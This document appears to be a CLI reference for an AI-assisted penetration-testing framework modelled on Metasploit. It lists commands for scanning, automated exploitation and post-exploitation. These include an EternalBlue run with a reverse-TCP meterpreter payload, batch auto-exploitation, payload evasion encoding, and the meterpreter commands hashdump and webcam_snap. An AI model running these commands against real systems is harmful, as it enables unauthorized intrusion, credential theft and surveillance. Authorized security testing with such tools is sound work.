# CLI Reference

Complete command-line interface reference for the Metasploit-AI Framework.

## Table of Contents

1. [Getting Started](#getting-started)
2. [Core Commands](#core-commands)
3. [Target Management](#target-management)
4. [Scanning Operations](#scanning-operations)
5. [AI Commands](#ai-commands)
6. [Exploitation Framework](#exploitation-framework)
7. [Session Management](#session-management)
8. [Reporting Commands](#reporting-commands)
9. [Configuration Commands](#configuration-commands)
10. [Utility Commands](#utility-commands)

## Getting Started

### Launching the CLI

```bash
# Start CLI interface
python app.py --mode cli

# Start with specific configuration
python app.py --mode cli --config config/production.yaml

# Start with debug mode
python app.py --mode cli --debug
```

### CLI Interface

```
    __  ___     __                  __      _ __        ___    ____
   /  |/  /__  / /_____ _____ ____  / /___  (_) /_      /   |  /  _/
  / /|_/ / _ \/ __/ __ `/ __ `/ __ \/ / __ \/ / __/_____/ /| |  / /  
 / /  / /  __/ /_/ /_/ / /_/ / /_/ / / /_/ / / /_/_____/ ___ |_/ /   
/_/  /_/\___/\__/\__,_/\__, /\____/_/\____/_/\__/     /_/  |_/___/   
                      /____/                                         

Metasploit-AI Framework v1.0.0
Created by Yashab Alam (ZehraSec)

msf-ai>
```

### Basic Navigation

```bash
# Show help
msf-ai> help
msf-ai> ?

# Get help for specific command
msf-ai> help scan
msf-ai> scan --help

# Clear screen
msf-ai> clear

# Exit framework
msf-ai> exit
msf-ai> quit
```

## Core Commands

### Framework Information

```bash
# Show framework version and information
msf-ai> version
msf-ai> info

# Show system status
msf-ai> status

# Show loaded modules
msf-ai> show modules

# Show active sessions
msf-ai> show sessions

# Show recent activities
msf-ai> show history
```

### Help System

```bash
# General help
msf-ai> help

# Category-specific help
msf-ai> help scan
msf-ai> help ai
msf-ai> help exploit

# Command-specific help
msf-ai> scan --help
msf-ai> ai analyze --help
```

## Target Management

### Adding Targets

```bash
# Add single target
msf-ai> targets add 192.168.1.100

# Add IP range
msf-ai> targets add 192.168.1.0/24

# Add multiple targets
msf-ai> targets add 192.168.1.100,192.168.1.101,192.168.1.102

# Add from file
msf-ai> targets add --file targets.txt

# Add with labels
msf-ai> targets add 192.168.1.100 --label "Web Server" --tags web,production
```

### Managing Targets

```bash
# List all targets
msf-ai> targets list
msf-ai> targets

# Show target details
msf-ai> targets info 192.168.1.100
msf-ai> targets show <target_id>

# Search targets
msf-ai> targets search --label "Web Server"
msf-ai> targets search --tag web

# Update target information
msf-ai> targets update 192.168.1.100 --label "Updated Label"

# Remove targets
msf-ai> targets remove 192.168.1.100
msf-ai> targets clear
```

### Target Groups

```bash
# Create target group
msf-ai> targets group create "Web Servers" --targets 192.168.1.100,192.168.1.101

# List groups
msf-ai> targets group list

# Add targets to group
msf-ai> targets group add "Web Servers" 192.168.1.102

# Remove from group
msf-ai> targets group remove "Web Servers" 192.168.1.102
```

## Scanning Operations

### Basic Scanning

```bash
# Discovery scan
msf-ai> scan 192.168.1.0/24 --type discovery

# Service scan
msf-ai> scan 192.168.1.100 --type services

# Vulnerability scan
msf-ai> scan 192.168.1.100 --type vuln

# Comprehensive scan
msf-ai> scan 192.168.1.100 --type comprehensive

# Web application scan
msf-ai> scan https://example.com --type web
```

### Advanced Scanning Options

```bash
# Custom port ranges
msf-ai> scan 192.168.1.100 --ports 1-1000
msf-ai> scan 192.168.1.100 --ports 80,443,8080,8443

# Timing options
msf-ai> scan 192.168.1.0/24 --timing paranoid
msf-ai> scan 192.168.1.0/24 --timing aggressive

# Scan techniques
msf-ai> scan 192.168.1.100 --technique syn
msf-ai> scan 192.168.1.100 --technique tcp,udp

# Stealth options
msf-ai> scan 192.168.1.100 --stealth --decoy 192.168.1.50,192.168.1.51

# Output options
msf-ai> scan 192.168.1.100 --output json --save results.json
```

### Scan Management

```bash
# List active scans
msf-ai> scans list
msf-ai> scans active

# Show scan details
msf-ai> scans info <scan_id>
msf-ai> scans show <scan_id>

# Pause/resume scans
msf-ai> scans pause <scan_id>
msf-ai> scans resume <scan_id>

# Stop scan
msf-ai> scans stop <scan_id>

# Show scan results
msf-ai> scans results <scan_id>
msf-ai> show results --scan <scan_id>
```

## AI Commands

### Vulnerability Analysis

```bash
# Analyze all discovered vulnerabilities
msf-ai> ai analyze

# Analyze specific target
msf-ai> ai analyze --target 192.168.1.100

# Deep analysis with context
msf-ai> ai analyze --target 192.168.1.100 --deep --context enterprise

# Analyze by severity
msf-ai> ai analyze --severity critical,high

# Show analysis results
msf-ai> ai show analysis <analysis_id>
```

### Exploit Recommendations

```bash
# Get exploit recommendations
msf-ai> ai recommend --target 192.168.1.100

# Filter by severity
msf-ai> ai recommend --target 192.168.1.100 --severity critical

# Show success probability
msf-ai> ai recommend --target 192.168.1.100 --show-probability

# Filter by minimum probability
msf-ai> ai recommend --target 192.168.1.100 --min-probability 0.8

# Get recommendations for specific vulnerability
msf-ai> ai recommend --cve CVE-2021-34527
```

### Payload Generation

```bash
# Generate optimized payload
msf-ai> ai payload --target 192.168.1.100 --type meterpreter

# Generate with evasion
msf-ai> ai payload --target 192.168.1.100 --evasion advanced

# Custom requirements
msf-ai> ai payload --target 192.168.1.100 --requirements stealth,persistence

# Show generated payloads
msf-ai> ai payloads list
msf-ai> ai payloads show <payload_id>
```

### AI Model Management

```bash
# List available models
msf-ai> ai models list

# Update models
msf-ai> ai models update

# Download specific model
msf-ai> ai models download vulnerability_analyzer

# Show model information
msf-ai> ai models info vulnerability_analyzer

# Model statistics
msf-ai> ai models stats
```

## Exploitation Framework

### Exploit Management

```bash
# List available exploits
msf-ai> exploits list

# Search exploits
msf-ai> exploits search --platform windows
msf-ai> exploits search --cve CVE-2017-0144
msf-ai> exploits search ms17

# Show exploit information
msf-ai> exploits info ms17_010_eternalblue
msf-ai> exploits show windows/smb/ms17_010_eternalblue

# Check exploit compatibility
msf-ai> exploits check ms17_010_eternalblue --target 192.168.1.100
```

### Exploit Execution

```bash
# Manual exploit execution
msf-ai> exploit ms17_010_eternalblue --target 192.168.1.100 --payload windows/meterpreter/reverse_tcp

# Set exploit options
msf-ai> exploit ms17_010_eternalblue --target 192.168.1.100 --lhost 192.168.1.50 --lport 4444

# AI-assisted exploitation
msf-ai> ai exploit --target 192.168.1.100 --auto

# Exploit chaining
msf-ai> ai exploit --target 192.168.1.100 --chain --depth 3

# Batch exploitation
msf-ai> exploit --targets-file targets.txt --auto
```

### Payload Management

```bash
# List available payloads
msf-ai> payloads list

# Search payloads
msf-ai> payloads search meterpreter
msf-ai> payloads search --platform windows

# Generate payload
msf-ai> payload generate windows/meterpreter/reverse_tcp --lhost 192.168.1.50 --lport 4444

# Encode payload
msf-ai> payload encode --encoder x86/shikata_ga_nai --iterations 3

# Show payload options
msf-ai> payload info windows/meterpreter/reverse_tcp
```

## Session Management

### Session Operations

```bash
# List active sessions
msf-ai> sessions list
msf-ai> sessions

# Show session information
msf-ai> sessions info 1
msf-ai> sessions show 1

# Interact with session
msf-ai> sessions interact 1

# Execute command in session
msf-ai> sessions execute 1 "whoami"

# Upload/download files
msf-ai> sessions upload 1 /local/file.txt /remote/path/
msf-ai> sessions download 1 /remote/file.txt /local/path/
```

### Session Management

```bash
# Kill session
msf-ai> sessions kill 1

# Kill all sessions
msf-ai> sessions kill --all

# Background session
msf-ai> sessions background 1

# Migrate session process
msf-ai> sessions migrate 1 --pid 1234

# Upgrade session
msf-ai> sessions upgrade 1 --to meterpreter
```

### Meterpreter Commands

```bash
# When in meterpreter session
meterpreter> sysinfo
meterpreter> getuid
meterpreter> ps
meterpreter> ls
meterpreter> pwd
meterpreter> cd C:\
meterpreter> download file.txt
meterpreter> upload file.txt
meterpreter> execute -f cmd.exe -i
meterpreter> migrate 1234
meterpreter> hashdump
meterpreter> screenshot
meterpreter> webcam_snap
meterpreter> background
```

## Reporting Commands

### Report Generation

```bash
# Generate HTML report
msf-ai> report generate --format html --output report.html

# Generate PDF report
msf-ai> report generate --format pdf --template executive --output executive.pdf

# Generate JSON data
msf-ai> report generate --format json --output data.json

# Custom report options
msf-ai> report generate --format html --include-screenshots --filter severity:high
```

### Report Management

```bash
# List generated reports
msf-ai> reports list

# Show report information
msf-ai> reports info <report_id>

# Export report
msf-ai> reports export <report_id> --format pdf

# Delete report
msf-ai> reports delete <report_id>

# Archive reports
msf-ai> reports archive --older-than 30d
```

### Report Templates

```bash
# List available templates
msf-ai> report templates list

# Create custom template
msf-ai> report template create --name "Custom Template" --sections executive,technical

# Show template information
msf-ai> report template info executive

# Update template
msf-ai> report template update executive --add-section compliance
```

## Configuration Commands

### Configuration Management

```bash
# Show current configuration
msf-ai> config show

# Show specific section
msf-ai> config show database
msf-ai> config show ai.models

# Set configuration value
msf-ai> config set database.type postgresql
msf-ai> config set ai.models.auto_update true

# Reset configuration
msf-ai> config reset database
msf-ai> config reset --all

# Reload configuration
msf-ai> config reload
```

### Environment Management

```bash
# Show environment information
msf-ai> env show

# Set environment variable
msf-ai> env set DB_PASSWORD secret123

# Load environment from file
msf-ai> env load .env

# Show loaded modules and versions
msf-ai> env modules
```

## Utility Commands

### Database Operations

```bash
# Database status
msf-ai> db status

# Connect to database
msf-ai> db connect

# Initialize database
msf-ai> db init

# Backup database
msf-ai> db backup --output backup.sql

# Restore database
msf-ai> db restore backup.sql

# Clean old data
msf-ai> db cleanup --older-than 30d
```

### System Operations

```bash
# System information
msf-ai> system info

# Check system requirements
msf-ai> system check

# Update framework
msf-ai> system update

# Show resource usage
msf-ai> system resources

# Show logs
msf-ai> logs show --tail 50
msf-ai> logs show --level error
```

### Plugin Management

```bash
# List plugins
msf-ai> plugins list

# Install plugin
msf-ai> plugins install osint_collector

# Enable/disable plugin
msf-ai> plugins enable osint_collector
msf-ai> plugins disable osint_collector

# Configure plugin
msf-ai> plugins config osint_collector --api-key KEY123

# Show plugin information
msf-ai> plugins info osint_collector
```

## Command Aliases and Shortcuts

### Common Aliases

```bash
# Navigation shortcuts
msf-ai> ls        # targets list
msf-ai> cd <id>   # targets info <id>

# Scan shortcuts
msf-ai> nmap      # scan with nmap defaults
msf-ai> ping      # scan --type discovery

# AI shortcuts
msf-ai> analyze   # ai analyze
msf-ai> recommend # ai recommend

# Session shortcuts
msf-ai> s         # sessions list
msf-ai> s <id>    # sessions interact <id>
```

### Custom Aliases

```bash
# Create custom alias
msf-ai> alias create quick-scan "scan --type comprehensive --timing aggressive"

# Use custom alias
msf-ai> quick-scan 192.168.1.100

# List aliases
msf-ai> alias list

# Remove alias
msf-ai> alias remove quick-scan
```

## Script and Automation

### Running Scripts

```bash
# Run automation script
msf-ai> script run pentest_automation.rb

# Run with parameters
msf-ai> script run custom_scan.py --targets targets.txt --output results/

# List available scripts
msf-ai> script list

# Show script information
msf-ai> script info pentest_automation.rb
```

### Batch Operations

```bash
# Execute commands from file
msf-ai> batch run commands.txt

# Save command history
msf-ai> history save session_commands.txt

# Replay commands
msf-ai> history replay session_commands.txt
```

---

*For more detailed examples and advanced usage, see the [User Manual](user-manual.md) and [Tutorials](tutorials/).*

---

*Created by [Yashab Alam](https://github.com/yashab-cyber) and the [ZehraSec](https://www.zehrasec.com) Team*
